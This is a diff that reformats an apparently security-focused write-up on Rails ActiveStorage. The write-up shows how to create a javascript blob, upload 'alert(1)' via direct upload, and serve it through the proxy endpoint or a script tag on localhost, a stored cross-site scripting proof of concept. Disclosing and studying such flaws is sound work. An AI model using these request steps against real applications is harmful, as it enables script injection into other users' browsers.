@@ -22,7 +22,8 @@ A couple of security considerations also exist:
   
   ```rb
     def sanitized
-      @filename.encode(Encoding::UTF_8, invalid: :replace, undef: :replace, replace: "�").strip.tr("\u{202E}%$|:;/<>?*\"\t\r\n\\", "-")
+      @filename.encode(Encoding::UTF_8, invalid: :replace, undef: :replace, replace: "�").
+        strip.tr("\u{202E}%$|:;/<>?*\"\t\r\n\\", "-")
     end
   ```
   
@@ -75,7 +76,15 @@ Host: localhost:3000
 Content-type: application/json
 Content-Length: 145
 
-{ "blob":{ "filename":"test.js", "byte_size":"460", "checksum":"sfeC7XeVlcORGXQTjSHrcw==", "content_type":"text/javascript", "metadata": {} } }
+{
+  "blob": {
+    "filename": "test.js",
+    "byte_size": "460",
+    "checksum": "sfeC7XeVlcORGXQTjSHrcw==",
+    "content_type": "text/javascript",
+    "metadata": {}
+  }
+}
 ```
 
 The server should respond with a blob of JSON containing all the info we need.
@@ -91,10 +100,16 @@ The server should respond with a blob of JSON containing all the info we need.
   "byte_size": 8,
   "checksum": "I46W1bYqGuw3OXMEafJxkg==",
   "created_at": "2025-04-23T23:35:38.274Z",
-  "attachable_sgid": "eyJfcmFpbHMiOnsiZGF0YSI6ImdpZDovL3Byb3h5LXhzcy9BY3RpdmVTdG9yYWdlOjpCbG9iLzYzP2V4cGlyZXNfaW4iLCJwdXIiOiJhdHRhY2hhYmxlIn19--96b3263fa7716e9cd776a927e6669e80ce2ede68",
-  "signed_id": "eyJfcmFpbHMiOnsiZGF0YSI6NjMsInB1ciI6ImJsb2JfaWQifX0=--5ced2e88192089617d33f635398bb4a7595ba198",
+  "attachable_sgid": "eyJfcmFpbHMiOnsiZGF0YSI6ImdpZDovL3Byb3h5LXhzcy9BY3RpdmVTdG9yYWdlOjpCbG9iLzYzP2
+                      V4cGlyZXNfaW4iLCJwdXIiOiJhdHRhY2hhYmxlIn19--96b3263fa7716e9cd776a927e6669e80ce2ede68",
+  "signed_id":
+    "eyJfcmFpbHMiOnsiZGF0YSI6NjMsInB1ciI6ImJsb2JfaWQifX0=--5ced2e88192089617d33f635398bb4a7595ba198",
   "direct_upload": {
-    "url": "http://localhost:3000/rails/active_storage/disk/eyJfcmFpbHMiOnsiZGF0YSI6eyJrZXkiOiJzZHV6bnFtaW56dzdxMnFubmZhZWt1a2dmY2FtIiwiY29udGVudF90eXBlIjoidGV4dC9qYXZhc2NyaXB0IiwiY29udGVudF9sZW5ndGgiOjgsImNoZWNrc3VtIjoiSTQ2VzFiWXFHdXczT1hNRWFmSnhrZz09Iiwic2VydmljZV9uYW1lIjoibG9jYWwifSwiZXhwIjoiMjAyNS0wNC0yM1QyMzo0MDozOC4yOTlaIiwicHVyIjoiYmxvYl90b2tlbiJ9fQ==--30cd81cba0dc75cb2505313ce2bd4d67c57566cd",
+    "url": "http://localhost:3000/rails/active_storage/disk/eyJfcmFpbHMiOnsiZGF0YSI6eyJrZ
+XkiOiJzZHV6bnFtaW56dzdxMnFubmZhZWt1a2dmY2FtIiwiY29udGVudF90eXBlIjoidGV4dC9qYXZhc2NyaXB0Iiwi
+Y29udGVudF9sZW5ndGgiOjgsImNoZWNrc3VtIjoiSTQ2VzFiWXFHdXczT1hNRWFmSnhrZz09Iiwic2VydmljZV9uYW1
+lIjoibG9jYWwifSwiZXhwIjoiMjAyNS0wNC0yM1QyMzo0MDozOC4yOTlaIiwicHVyIjoiYmxvYl90b2
+tlbiJ9fQ==--30cd81cba0dc75cb2505313ce2bd4d67c57566cd",
     "headers": {
       "Content-Type": "text/javascript"
     }
@@ -107,7 +122,11 @@ The server should respond with a blob of JSON containing all the info we need.
 We need to take the `url` from the JSON above and add our content:
 
 ```
-PUT /rails/active_storage/disk/eyJfcmFpbHMiOnsiZGF0YSI6eyJrZXkiOiJzZHV6bnFtaW56dzdxMnFubmZhZWt1a2dmY2FtIiwiY29udGVudF90eXBlIjoidGV4dC9qYXZhc2NyaXB0IiwiY29udGVudF9sZW5ndGgiOjgsImNoZWNrc3VtIjoiSTQ2VzFiWXFHdXczT1hNRWFmSnhrZz09Iiwic2VydmljZV9uYW1lIjoibG9jYWwifSwiZXhwIjoiMjAyNS0wNC0yM1QyMzo0MDozOC4yOTlaIiwicHVyIjoiYmxvYl90b2tlbiJ9fQ==--30cd81cba0dc75cb2505313ce2bd4d67c57566cd HTTP/1.1
+PUT /rails/active_storage/disk/eyJfcmFpbHMiOnsiZGF0YSI6eyJrZXkiOiJzZHV6bnFtaW56dz
+dxMnFubmZhZWt1a2dmY2FtIiwiY29udGVudF90eXBlIjoidGV4dC9qYXZhc2NyaXB0IiwiY29udGVudF9
+sZW5ndGgiOjgsImNoZWNrc3VtIjoiSTQ2VzFiWXFHdXczT1hNRWFmSnhrZz09Iiwic2VydmljZV9uYW1l
+IjoibG9jYWwifSwiZXhwIjoiMjAyNS0wNC0yM1QyMzo0MDozOC4yOTlaIiwicHVyIjoiYmxvYl90b2tlb
+iJ9fQ==--30cd81cba0dc75cb2505313ce2bd4d67c57566cd HTTP/1.1
 Host: localhost:3000
 Content-type: text/javascript
 Content-Length: 8
@@ -119,7 +138,8 @@ alert(1)
 
 Just take the `signed_id` and add it to the `/blobs/proxy` URL.
 ```
-GET /rails/active_storage/blobs/proxy/eyJfcmFpbHMiOnsiZGF0YSI6NjMsInB1ciI6ImJsb2JfaWQifX0=--5ced2e88192089617d33f635398bb4a7595ba198/test.js HTTP/1.1
+GET /rails/active_storage/blobs/proxy/eyJfcmFpbHMiOnsiZGF0YSI6NjMsInB1c
+iI6ImJsb2JfaWQifX0=--5ced2e88192089617d33f635398bb4a7595ba198/test.js HTTP/1.1
 ```
 
 Or, `<script src="http://localhost:3000/rails/active_storage/blobs/proxy/eyJfcmFpbHMiOnsiZGF0YSI6NjMsInB1ciI6ImJsb2JfaWQifX0=--5ced2e88192089617d33f635398bb4a7595ba198/test.js"></script>`
